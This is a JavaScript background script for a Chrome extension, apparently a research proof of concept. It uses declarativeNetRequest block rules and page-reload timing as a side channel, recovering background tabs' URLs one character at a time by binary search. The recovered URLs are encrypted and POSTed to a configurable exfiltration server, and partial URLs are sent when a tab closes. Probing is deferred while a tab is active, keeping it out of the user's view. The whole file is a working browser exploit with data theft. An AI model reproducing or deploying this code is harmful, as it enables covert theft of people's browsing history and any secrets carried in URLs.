const TIMEOUT_MS  = 5000;
const MAX_LEN     = 128;

const escRe = s => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
const escCC = c => c.replace(/[-\\\]^]/g, "\\$&");
const cls   = a => `[${a.map(escCC).join("")}]`;

const ALPHABET =
  "abcdefghijklmnopqrstuvwxyz" +
  "ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
  "0123456789:/?&=.-_%#@!~+,;";

const SORTED  = [...ALPHABET].sort();
const SCHEMES = ["https://", "http://"];

let leaking = false;
let blockThreshold = 30;
let currentLeakTabId = null;
let abortLeak = false;
let currentLeakScheme = null;  // scheme being leaked right now
let currentLeakPrefix = "";   // characters resolved so far
let globalPaused = false;
let calibrating = false;

// Publish current leak state to storage so the popup can read it
const publishStatus = () => {
    chrome.storage.local.set({
        leakStatus: {
            paused:      globalPaused,
            calibrating: calibrating,
            tabId:       currentLeakTabId,
            prefix:      currentLeakScheme ? currentLeakScheme + currentLeakPrefix : currentLeakPrefix,
            charPos:     currentLeakPrefix.length,
            maxLen:      MAX_LEN,
            queueLen:    queue.length + waitingForBackground.size,
            ts:          Date.now()
        }
    });
};

// ─── DNR rule management ───

const setBlock = async (regex) => {
    const rules = await chrome.declarativeNetRequest.getDynamicRules();
    await chrome.declarativeNetRequest.updateDynamicRules({
        removeRuleIds: rules.map(r => r.id),
        addRules: [{
            id: 1,
            priority: 1,
            action: { type: "block" },
            condition: {
                regexFilter: regex,
                isUrlFilterCaseSensitive: true,
                resourceTypes: ["main_frame"]
            }
        }]
    });
};

const clearRules = async () => {
    const rules = await chrome.declarativeNetRequest.getDynamicRules();
    await chrome.declarativeNetRequest.updateDynamicRules({
        removeRuleIds: rules.map(r => r.id)
    });
};

// ─── Timing oracle ───
// Uses per-probe temporary listeners. Waits for "loading" BEFORE accepting
// "complete" so stale completion events from error pages are ignored.

const reloadTab = (tabId) => {
    return new Promise(resolve => {
        if (abortLeak) { resolve(null); return; }
        let sawLoading = false;

        const listener = (tid, info) => {
            if (tid !== tabId) return;
            if (info.status === "loading") sawLoading = true;
            if (info.status === "complete" && sawLoading) {
                chrome.tabs.onUpdated.removeListener(listener);
                clearTimeout(timer);
                resolve(performance.now() - start);
            }
        };

        const start = performance.now();
        const timer = setTimeout(() => {
            chrome.tabs.onUpdated.removeListener(listener);
            resolve(abortLeak ? null : TIMEOUT_MS);
        }, TIMEOUT_MS);

        chrome.tabs.onUpdated.addListener(listener);
        chrome.tabs.reload(tabId, { bypassCache: true });
    });
};

// ─── Calibration ───
// Measures actual blocked vs. unblocked round-trip times and sets the
// threshold dynamically so it works on LAN, WAN, and everything in between.

const calibrate = async (tabId) => {
    calibrating = true;
    publishStatus();
    console.log("[*] Calibrating timing oracle...");

    // Warm up — first reload is often an outlier
    await clearRules();
    await reloadTab(tabId);

    // Blocked samples (rule matches everything)
    await setBlock("https://.*|http://.*");
    const b = [];
    for (let i = 0; i < 5; i++) {
        if (abortLeak) return;
        b.push(await reloadTab(tabId));
    }
    b.sort((a, c) => a - c);
    const blocked = b[Math.floor(b.length / 2)]; // median

    // Unblocked samples (no rules active)
    await clearRules();
    await reloadTab(tabId); // warm-up after rule change
    const u = [];
    for (let i = 0; i < 5; i++) {
        if (abortLeak) return;
        u.push(await reloadTab(tabId));
    }
    u.sort((a, c) => a - c);
    const unblocked = u[Math.floor(u.length / 2)]; // median

    // Sanity check — blocked must be significantly faster than unblocked
    if (blocked >= unblocked * 0.8) {
        // Can't distinguish — use a safe fallback
        blockThreshold = 40;
        console.warn(
            `[!] Calibration ambiguous: blocked=${Math.round(blocked)}ms,`,
            `unblocked=${Math.round(unblocked)}ms — using fallback threshold=${blockThreshold}ms`
        );
        calibrating = false;
        publishStatus();
    } else {
        blockThreshold = blocked + (unblocked - blocked) * 0.3;
        console.log(
            `[*] Calibration done: blocked=${Math.round(blocked)}ms,`,
            `unblocked=${Math.round(unblocked)}ms,`,
            `threshold=${Math.round(blockThreshold)}ms`
        );
    }
    calibrating = false;
    publishStatus();
};

const blockedBy = async (regex, tabId, votes = 3) => {
    if (abortLeak) return false;
    await setBlock(regex);
    let blocks = 0;
    for (let i = 0; i < votes; i++) {
        if (abortLeak) return false;
        const t = await reloadTab(tabId);
        if (t === null) return false; // aborted
        const hit = t < blockThreshold;
        console.log(`[t${i+1}/${votes}] ${Math.round(t)}ms ${hit ? "BLOCK" : "ALLOW"} ...${regex.slice(-30)}`);
        if (hit) blocks++;
        // Early exit if majority already determined
        if (blocks > votes / 2) return true;
        if ((votes - i - 1 + blocks) <= votes / 2) return false;
    }
    return blocks > votes / 2;
};

// ─── Leak logic ───

const detectScheme = async (tabId) => {
    for (const scheme of SCHEMES) {
        if (await blockedBy(scheme + ".*", tabId)) {
            console.log("[*] Detected scheme:", scheme);
            return scheme;
        }
    }
    return null;
};

const leakChar = async (scheme, prefix, tabId) => {
    let set = SORTED.slice();
    while (set.length > 1) {
        if (abortLeak) return null;
        const mid  = set.length >> 1;
        const left = set.slice(0, mid);
        const re = scheme + escRe(prefix) + cls(left) + ".*";
        set = await blockedBy(re, tabId) ? left : set.slice(mid);
    }
    const c = set[0];
    if (!c) return null;
    // Verify the converged character actually blocks — if not, we're past the URL end
    const verified = await blockedBy(scheme + escRe(prefix + c) + ".*", tabId);
    return verified ? c : null;
};

const leak = async (tabId) => {
    let scheme, out, calibrated;

    // Resume from saved progress if available
    if (partialProgress.has(tabId)) {
        const saved = partialProgress.get(tabId);
        scheme     = saved.scheme;
        out        = saved.prefix;
        calibrated = saved.calibrated;
        console.log(`[*] Resuming tab ${tabId} from: ${scheme}${out}`);
        partialProgress.delete(tabId);
    } else {
        scheme     = null;
        out        = "";
        calibrated = false;
    }

    // Calibrate if we haven't yet for this tab
    if (!calibrated) {
        await calibrate(tabId);
        if (abortLeak) {
            partialProgress.set(tabId, { scheme, prefix: out, calibrated: false });
            return "";
        }
    }

    // Detect scheme if we don't have one yet
    if (!scheme) {
        scheme = await detectScheme(tabId);
        if (abortLeak) {
            if (!closingTabs.has(tabId))
                partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
            return "";
        }
        if (!scheme) {
            console.log("[-] Could not detect scheme (chrome:// / file:// / about:).");
            return "";
        }
    }

    let sameCount = 0, prev = out.length > 0 ? out[out.length - 1] : null;
    currentLeakScheme = scheme;
    currentLeakPrefix = out;
    for (let i = out.length; i < MAX_LEN; i++) {
        if (abortLeak) {
            // Save progress for later resume (unless the tab was closed)
            if (!closingTabs.has(tabId)) {
                partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
                console.log(`[!] Paused tab ${tabId} at: ${scheme}${out}`);
            }
            break;
        }
        const c = await leakChar(scheme, out, tabId);
        if (abortLeak) {
            if (!closingTabs.has(tabId)) {
                partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
                console.log(`[!] Paused tab ${tabId} at: ${scheme}${out}`);
            }
            break;
        }
        if (!c) break;
        sameCount = (c === prev) ? sameCount + 1 : 0;
        if (sameCount >= 3) break;
        out += c;
        currentLeakPrefix = out;
        publishStatus();
        prev = c;
        console.log("[+]", scheme + out);
    }
    await clearRules();
    currentLeakScheme = null;
    currentLeakPrefix = "";
    return abortLeak ? "" : scheme + out;
};

// --- Encryption (AES-GCM via Web Crypto API) ---
// Pre-shared key material — must match server
const PSK = "ch40s_r3s34rch_k3y_2026";

const deriveKey = async () => {
    const enc  = new TextEncoder();
    const base = await crypto.subtle.importKey(
        "raw", enc.encode(PSK), "PBKDF2", false, ["deriveKey"]
    );
    return crypto.subtle.deriveKey(
        { name: "PBKDF2", salt: enc.encode("dnr-salt"), iterations: 100000, hash: "SHA-256" },
        base,
        { name: "AES-GCM", length: 256 },
        false,
        ["encrypt"]
    );
};

const encryptPayload = async (data) => {
    const key = await deriveKey();
    const iv  = crypto.getRandomValues(new Uint8Array(12));
    const enc = new TextEncoder();
    const ct  = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, enc.encode(data));
    const toB64 = buf => {
        let bin = "";
        const bytes = new Uint8Array(buf);
        for (let i = 0; i < bytes.byteLength; i++) bin += String.fromCharCode(bytes[i]);
        return btoa(bin);
    };
    return { iv: toB64(iv.buffer), ct: toB64(ct) };
};

// --- Exfiltration ---
const DEFAULT_EXFIL_URL = "http://localhost:3000";

const getExfilUrl = () => new Promise(resolve =>
    chrome.storage.local.get("exfilUrl", ({ exfilUrl }) =>
        resolve((exfilUrl || DEFAULT_EXFIL_URL).replace(/\/$/, ""))
    )
);

const exfiltrate = async (urls, partial = false) => {
    const serverUrl = await getExfilUrl();
    const payload = await encryptPayload(JSON.stringify({ urls, partial }));
    await fetch(`${serverUrl}/upload`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ ...payload, ts: Date.now() })
    });
};

// --- Main ---

// Track which tabs have already been leaked so we don't repeat
const leakedTabs = new Set();

// Tabs that were closed while being actively leaked — don't save partial progress for these
const closingTabs = new Set();

// Listen for pause/resume commands from the popup
chrome.storage.onChanged.addListener((changes, area) => {
    if (area !== "local" || !("isPaused" in changes)) return;
    globalPaused = changes.isPaused.newValue;
    if (globalPaused) {
        // Abort any active leak — it will save to partialProgress
        if (currentLeakTabId !== null) abortLeak = true;
        console.log("[*] Leak engine paused by user");
        publishStatus();
    } else {
        console.log("[*] Leak engine resumed by user");
        publishStatus();
        processQueue();
    }
});

// Partial progress saved when a leak is aborted mid-way
// Map<tabId, { scheme: string, prefix: string, calibrated: boolean }>
const partialProgress = new Map();

const leakTab = async (tabId) => {
    currentLeakTabId = tabId;
    if (!globalPaused) abortLeak = false; // only clear abort flag if not paused
    publishStatus();
    let url = "";
    try {
        url = await leak(tabId);
    } catch (e) {
        console.error("[-] Leak error on tab", tabId, e);
        url = "";
    }
    currentLeakTabId = null;
    publishStatus();

    if (abortLeak || !url) {
        // Aborted — tab became active. Don't mark as leaked.
        abortLeak = false;
        return;
    }

    leakedTabs.add(tabId);
    console.log(`[*] Tab ${tabId} leaked:`, url);

    // Append to stored list
    const { leakedUrls = [] } = await chrome.storage.local.get("leakedUrls");
    leakedUrls.push({ tabId, url, ts: Date.now() });
    await chrome.storage.local.set({ leakedUrls });

    // Exfiltrate immediately
    await exfiltrate([url]);
};

// Queue-based processing — leaks tabs one at a time
const queue = [];
let processing = false;

// Tabs that can't be leaked yet because they're active.
// Moved back to the queue when they go to background.
const waitingForBackground = new Set();

const enqueue = (tabId) => {
    if (leakedTabs.has(tabId)) return;      // already done
    if (queue.includes(tabId)) return;       // already queued
    if (waitingForBackground.has(tabId)) return; // already waiting
    queue.push(tabId);
    processQueue();
};

const processQueue = async () => {
    if (processing) return;
    if (globalPaused) return;
    processing = true;
    leaking = true;
    publishStatus();
    while (queue.length > 0) {
        if (globalPaused) break;
        const tabId = queue.shift();
        let tab;
        try { tab = await chrome.tabs.get(tabId); } catch { publishStatus(); continue; }
        if (tab.active) {
            // Can't leak right now — park it until it goes to background
            console.log(`[*] Tab ${tabId} is active, deferring until it goes to background`);
            waitingForBackground.add(tabId);
            publishStatus();
            continue;
        }
        console.log(`[*] Leaking background tab ${tabId} (${queue.length} remaining in queue)...`);
        await leakTab(tabId);
        if (globalPaused) break; // stop immediately if paused mid-queue
    }
    leaking = false;
    processing = false;
    publishStatus();
};

// On user navigation / new tab load, queue for leaking
chrome.tabs.onUpdated.addListener(async (tabId, info) => {
    if (info.status === "complete") {
        if (tabId === currentLeakTabId) return; // ignore oracle reloads on the tab being probed
        if (leakedTabs.has(tabId)) return;      // already done
        let tab;
        try { tab = await chrome.tabs.get(tabId); } catch { return; }
        if (tab.active) {
            // Tab is active — park it so it's queued when the user switches away
            if (!waitingForBackground.has(tabId) && !queue.includes(tabId)) {
                console.log(`[*] New/navigated active tab ${tabId} — will queue when backgrounded`);
                waitingForBackground.add(tabId);
                publishStatus();
            }
            return;
        }
        leakedTabs.delete(tabId); // URL may have changed
        console.log("[*] Background navigation detected on tab", tabId);
        enqueue(tabId);
    }
});

// When a tab is closed, clean up
chrome.tabs.onRemoved.addListener(async (tabId) => {
    // If this tab was being actively leaked, exfil whatever we have
    if (currentLeakTabId === tabId && currentLeakPrefix) {
        const partial = (currentLeakScheme || "") + currentLeakPrefix;
        console.log(`[!] Tab ${tabId} closed mid-leak — exfiltrating partial: ${partial}`);
        closingTabs.add(tabId); // prevent leak() from saving partialProgress
        abortLeak = true;
        await exfiltrate([partial], true);
    } else if (partialProgress.has(tabId)) {
        // Tab closed while paused — exfil the saved partial progress
        const p = partialProgress.get(tabId);
        const partial = (p.scheme || "") + (p.prefix || "");
        if (partial) {
            console.log(`[!] Tab ${tabId} closed with saved partial — exfiltrating: ${partial}`);
            await exfiltrate([partial], true);
        }
    }
    leakedTabs.delete(tabId);
    partialProgress.delete(tabId);
    waitingForBackground.delete(tabId);
    closingTabs.delete(tabId);
    // Remove from queue if waiting to be leaked
    const qi = queue.indexOf(tabId);
    if (qi !== -1) queue.splice(qi, 1);
    publishStatus();
});

// When a tab becomes active, abort if we're leaking it.
// Also re-enqueue any tabs that were waiting to go to background.
chrome.tabs.onActivated.addListener(({ tabId }) => {
    // Abort the current leak if this tab is being analyzed
    if (currentLeakTabId === tabId) {
        console.log(`[!] Tab ${tabId} became active — pausing leak, will resume when backgrounded`);
        abortLeak = true;
        // Park it — onActivated for the NEXT tab switch will re-enqueue it
        waitingForBackground.add(tabId);
    }

    // The previously-active tab(s) are now in background — release deferred tabs
    // (excluding the just-activated tab itself)
    for (const deferredId of waitingForBackground) {
        if (deferredId !== tabId) {
            console.log(`[*] Tab ${deferredId} is now in background — re-enqueueing`);
            waitingForBackground.delete(deferredId);
            enqueue(deferredId);
        }
    }
    publishStatus();
});

// On startup, restore paused state then queue background tabs (default: paused)
chrome.storage.local.get("isPaused", ({ isPaused }) => {
    globalPaused = isPaused !== false; // default to true if never set
    if (isPaused === undefined) chrome.storage.local.set({ isPaused: true });
    chrome.tabs.query({}).then(tabs => {
        const bgTabs = tabs.filter(t => !t.active);
        console.log(`[*] Found ${bgTabs.length} background tab(s), queueing... (paused=${globalPaused})`);
        for (const tab of bgTabs) enqueue(tab.id);
        publishStatus();
    });
});